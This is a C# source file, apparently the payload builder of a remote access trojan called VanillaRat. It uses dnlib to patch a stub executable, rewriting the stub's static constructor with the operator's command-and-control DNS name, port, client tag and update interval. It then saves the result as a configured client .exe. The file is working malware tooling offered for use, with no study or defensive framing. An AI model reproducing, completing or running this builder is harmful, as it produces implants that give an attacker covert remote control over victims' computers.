using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace VanillaRat.Classes
{
    class Builder
    {
        public void BuildClient(string Port, string DNS, string Name, string ClientTag, string UpdateInterval)
        {
            VanillaRatStub.ClientSettings.DNS = DNS;
            VanillaRatStub.ClientSettings.Port = Port;
            VanillaRatStub.ClientSettings.ClientTag = ClientTag;
            VanillaRatStub.ClientSettings.UpdateInterval = UpdateInterval;
            string FullName = "VanillaRatStub.ClientSettings";
            var Assembly = AssemblyDef.Load("VanillaRatStub.exe");
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = VanillaRatStub.ClientSettings.DNS;
                        Constructor.Body.Instructions[2].Operand = VanillaRatStub.ClientSettings.Port;
                        Constructor.Body.Instructions[4].Operand = VanillaRatStub.ClientSettings.ClientTag;
                        Constructor.Body.Instructions[6].Operand = VanillaRatStub.ClientSettings.UpdateInterval;
                        if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                            Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
                        Assembly.Write(Environment.CurrentDirectory + @"\Clients\" + Name + ".exe");
                    }
                }
                return;
            }
        }
    }
}
